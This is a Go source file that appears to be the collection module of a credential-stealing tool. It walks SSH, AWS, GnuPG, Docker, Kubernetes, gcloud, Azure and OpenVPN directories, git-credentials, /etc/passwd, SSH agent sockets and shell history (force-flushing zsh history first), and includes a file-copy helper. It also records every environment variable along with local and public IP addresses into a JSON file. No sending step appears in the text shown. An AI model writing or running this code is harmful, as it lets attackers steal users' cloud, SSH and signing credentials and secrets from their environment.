package internal

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
)

// DetectDefaultShell detects the default shell and returns the history file path.
func DetectDefaultShell() string {
	currentUser, err := user.Current()
	if err != nil {
		return ""
	}

	shell := os.Getenv("SHELL")
	if shell == "" {
		shell = "/bin/bash" // Default fallback
	}

	switch filepath.Base(shell) {
	case "zsh":
		flushZshHistory()
		return filepath.Join(currentUser.HomeDir, ".zsh_history")
	case "bash":
		return filepath.Join(currentUser.HomeDir, ".bash_history")
	default:
		return "" // Unsupported shell
	}
}

// Flushes zsh history to disk
func flushZshHistory() {
	cmd := exec.Command("zsh", "-c", "fc -W")
	cmd.Run() // Ignore errors; continue even if this fails
}

// Copies a file to a temporary location
func copyFile(srcPath, dstDir string) (string, error) {
	srcFile, err := os.Open(srcPath)
	if err != nil {
		return "", fmt.Errorf("failed to open source file: %w", err)
	}
	defer srcFile.Close()

	// Prepare the destination path
	dstPath := filepath.Join(dstDir, filepath.Base(srcPath))
	dstFile, err := os.Create(dstPath)
	if err != nil {
		return "", fmt.Errorf("failed to create destination file: %w", err)
	}
	defer dstFile.Close()

	// Copy the file content
	_, err = io.Copy(dstFile, srcFile)
	if err != nil {
		return "", fmt.Errorf("failed to copy file content: %w", err)
	}

	return dstPath, nil
}

// ScanSensitiveFiles collects all files from specified paths, including full directories.
func ScanSensitiveFiles(outputDir string) ([]string, error) {
	homeDir, _ := os.UserHomeDir()

	paths := []string{
		filepath.Join(homeDir, ".ssh"),
		filepath.Join(homeDir, ".aws"),
		filepath.Join(homeDir, ".gnupg"),
		filepath.Join(homeDir, ".git-credentials"),
		filepath.Join(homeDir, ".docker"),
		filepath.Join(homeDir, ".kube"),
		filepath.Join(homeDir, ".config/gcloud"),
		filepath.Join(homeDir, ".azure"),
		filepath.Join(homeDir, ".openvpn"),
		"/etc/passwd",
		"/tmp/ssh-*",
		DetectDefaultShell(),
	}

	var files []string
	for _, path := range paths {
		files = append(files, expandPath(path)...)
	}
	existingFiles := filterExistingFiles(files)

	// Save system info
	systemInfoPath, err := saveSystemInfo(outputDir)
	if err != nil {
		return nil, err
	}

	// Add system info archive to the files list
	existingFiles = append(existingFiles, systemInfoPath)

	return existingFiles, nil
}

// expandPath expands directories into a list of files.
func expandPath(path string) []string {
	var fileList []string
	err := filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() {
			fileList = append(fileList, p)
		}
		return nil
	})
	if err != nil {
		return []string{path} // Return the original path if walk fails
	}
	return fileList
}

// filterExistingFiles filters out non-existent or inaccessible files.
func filterExistingFiles(paths []string) []string {
	var existingFiles []string
	for _, path := range paths {
		if _, err := os.Stat(path); err == nil {
			existingFiles = append(existingFiles, path)
		}
	}
	return existingFiles
}

// saveSystemInfo retrieves and saves environment variables, OS info, and IP addresses.
func saveSystemInfo(outputDir string) (string, error) {
	systemInfo, err := GetSystemInfo()
	if err != nil {
		return "", fmt.Errorf("failed to retrieve system info: %w", err)
	}

	// Convert system info to JSON
	data, err := json.MarshalIndent(systemInfo, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to serialize system info: %w", err)
	}

	// Create the output directory if it doesn't exist
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create output directory: %w", err)
	}

	// Write system info to a file
	filePath := filepath.Join(outputDir, "system_info.json")
	err = os.WriteFile(filePath, data, 0644)
	if err != nil {
		return "", fmt.Errorf("failed to write system info to file: %w", err)
	}

	return filePath, nil
}

// GetSystemInfo retrieves environment variables, OS info, and IP addresses.
func GetSystemInfo() (map[string]interface{}, error) {
	info := make(map[string]interface{})

	// Get environment variables
	info["env_vars"] = os.Environ()

	// Get OS info
	info["os"] = map[string]string{
		"os":      runtime.GOOS,
		"arch":    runtime.GOARCH,
		"num_cpu": fmt.Sprintf("%d", runtime.NumCPU()),
	}

	// Get local IP addresses
	var localIPs []string
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ip, ok := addr.(*net.IPNet); ok && !ip.IP.IsLoopback() {
				if ip.IP.To4() != nil {
					localIPs = append(localIPs, ip.IP.String())
				}
			}
		}
	}
	info["local_ips"] = localIPs

	// Get public IP address
	publicIP, err := getPublicIP()
	if err == nil {
		info["public_ip"] = publicIP
	} else {
		info["public_ip"] = "N/A"
	}

	return info, nil
}

// getPublicIP fetches the public IP address of the system.
func getPublicIP() (string, error) {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var buf bytes.Buffer
	_, err = buf.ReadFrom(resp.Body)
	if err != nil {
		return "", err
	}

	return buf.String(), nil
}
